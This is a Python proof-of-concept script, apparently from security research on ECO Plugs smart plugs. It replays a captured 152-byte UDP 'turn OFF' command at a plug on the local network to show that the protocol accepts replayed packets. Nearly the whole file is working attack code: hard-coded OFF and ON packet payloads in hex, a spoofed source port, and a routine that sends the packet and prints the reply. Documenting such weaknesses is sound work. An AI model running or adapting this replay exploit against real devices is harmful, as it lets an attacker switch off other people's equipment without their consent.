#!/usr/bin/env python3
"""
Replay test: send a captured OFF command straight at the plug.

If this works, it proves that the ECO Plugs protocol accepts replayed
packets — i.e. no per-packet nonce or timestamp is validated — and we can
drive the plug from any LAN-connected host.

Usage:
    python3 replay_test.py <plug_ip>

Run from a host on the same L2 LAN as the plug.
"""
import socket
import sys
import time

# Raw 152-byte UDP payload captured as pkt 48 in 03-phone-side.pcap
# Command = turn OFF (opcode 0x6A, state 0x00).
OFF_PACKET_HEX = (
    "a8442dac"                                  # TXID
    "1700000000000000dae20c00"                  # fixed header
    "d1327cef93335ad88a040f8ab3631e95"          # obfuscated body (56 bytes)
    "8c7069e0b23d48b0db380f9f971f5a29"
    "e02ca534f931b407f2c68712cbcb967d"
    "a5d33286a5bbc449"
    "00000000"                                  # pad
    "6a000000"                                  # opcode 6A = command
    "00000000"                                  # state 0 = OFF
    + "00" * 68                                 # padding to 152 bytes
)

# Raw 152-byte ON command (pkt 77)
ON_PACKET_HEX = (
    "425d2dac"
    "1700000000000000dae20c00"
    "3b2b7cef792a5ad8601d0f8a597a1e95"
    "666969e0582448b031210f9f7d065a29"
    "0a35a5341328b40718df871221d2967d"
    "4fca32864fa2c449"
    "00000000"
    "6a000000"
    "01000000"                                  # state 1 = ON
    + "00" * 68
)

PLUG_PORT = 1022
PHONE_SRC_PORT = 9090


def send_and_wait(plug_ip: str, payload: bytes, label: str) -> bytes | None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", PHONE_SRC_PORT))
    sock.settimeout(2.0)

    print(f"[{label}] sending {len(payload)} bytes → {plug_ip}:{PLUG_PORT}")
    # Phone sends each command ~4 times; mimic that.
    for i in range(4):
        sock.sendto(payload, (plug_ip, PLUG_PORT))
        time.sleep(0.01)

    try:
        data, src = sock.recvfrom(1024)
        print(f"[{label}] REPLY from {src}: {len(data)} bytes")
        print(f"  hex: {data.hex()}")
        print(f"  opcode[76:80] = {data[76:80].hex()}")
        print(f"  state[80:84]  = {data[80:84].hex()}")
        return data
    except socket.timeout:
        print(f"[{label}] no reply within 2s")
        return None
    finally:
        sock.close()


def main():
    plug_ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.87"

    payload = bytes.fromhex(OFF_PACKET_HEX)
    assert len(payload) == 152, f"payload is {len(payload)} bytes, expected 152"

    send_and_wait(plug_ip, payload, "OFF replay")


if __name__ == "__main__":
    main()
